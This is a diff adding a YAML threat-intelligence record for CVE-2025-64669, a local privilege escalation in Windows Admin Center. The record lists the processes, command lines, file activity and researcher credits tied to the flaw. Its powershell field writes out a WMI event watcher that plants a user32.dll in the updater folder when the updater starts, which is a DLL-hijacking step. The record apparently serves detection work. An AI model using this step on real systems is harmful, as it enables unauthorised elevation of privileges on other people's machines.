@@ -1,0 +1,42 @@
+description: Local Privilege Escalation in Windows Admin Center due to insecure directory
+  permissions
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - WindowsAdminCenterUpdater.exe
+  commandline:
+  - /c PowerShell -ExecutionPolicy AllSigned -File "C:\\ProgramData\\WindowsAdminCenter\\Extensions\\<ExtensionName>\\uninstall\\script.ps1"
+  - /api/update
+  powershell:
+  - Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 0.1 WHERE
+    TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'WindowsAdminCenterUpdater.exe'"
+    -Action {Copy-Item 'C:\\Users\\Public\\user32.dll' 'C:\\ProgramData\\WindowsAdminCenter\\Updater\\user32.dll'
+    -Force}
+  scripting_engine: []
+  registry_keys: []
+  image_load:
+  - user32.dll
+  network_connections: []
+  file_activity:
+  - C:\\ProgramData\\WindowsAdminCenter\\Extensions\\<ExtensionName>\\uninstall\\script.ps1
+  - C:\\Users\\Public\\test.txt
+  - C:\\ProgramData\\WindowsAdminCenter\\Updater\\user32.dll
+  persistence: []
+  process_relations:
+  - cmd.exe->powershell.exe
+  - WindowsAdminCenterUpdater.exe->user32.dll
+CVEs:
+- CVE-2025-64669
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls: []
+authors:
+- Ilan Kalendarov
+- Ben Zamir
+- Elad Beber
+reference: https://cymulate.com/blog/cve-2025-64669-windows-admin-center
+date_of_publication: March 04, 2026
+file_creation_date: March 04, 2026
